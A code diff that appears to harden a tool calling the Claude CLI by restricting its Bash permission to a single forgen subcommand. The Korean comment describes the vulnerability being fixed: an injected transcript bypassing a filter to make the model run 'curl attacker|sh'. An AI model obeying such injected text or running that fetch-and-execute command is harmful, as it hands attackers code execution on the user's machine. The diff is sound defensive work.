@@ -269,10 +269,16 @@ try {
 ${sanitizedSummary.slice(0, 6000)}
 ---`;
 
+  // P1-S1 fix (2026-04-20): 과거에는 `--allowedTools Bash`로 전체 Bash 권한을 줘서
+  // 악성 transcript(공급망 인젝션)가 filter를 우회해 `curl attacker|sh` 같은 명령을
+  // 피해자 권한으로 실행시킬 수 있었다. 이제 `Bash(forgen compound:*)`로 좁혀 Claude
+  // 가 compound 추출용 forgen CLI 호출만 가능하게 한다. filter-bypass 시에도 임의
+  // 명령 실행 차단.
   try {
-    execClaudeRetry(['-p', solutionPrompt, '--allowedTools', 'Bash', '--model', COMPOUND_MODEL], {
-      cwd, timeout: 90_000, stdio: ['pipe', 'ignore', 'pipe'],
-    });
+    execClaudeRetry(
+      ['-p', solutionPrompt, '--allowedTools', 'Bash(forgen compound:*)', '--model', COMPOUND_MODEL],
+      { cwd, timeout: 90_000, stdio: ['pipe', 'ignore', 'pipe'] },
+    );
   } catch (e) {
     process.stderr.write(`[forgen-auto-compound] solution extraction: ${e instanceof Error ? e.message : String(e)}\n`);
   }
